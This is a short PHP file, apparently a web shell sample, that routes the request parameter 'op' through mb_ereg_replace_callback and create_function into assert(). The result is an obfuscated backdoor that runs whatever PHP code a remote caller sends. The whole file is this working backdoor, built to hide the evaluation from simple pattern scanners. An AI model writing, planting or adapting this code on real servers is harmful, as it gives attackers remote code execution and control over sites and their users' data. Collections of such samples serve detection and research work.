<?php
  mb_ereg_replace_callback('.+', create_function('$arr', 'return assert($arr[0]);'),$_REQUEST['op']);
?>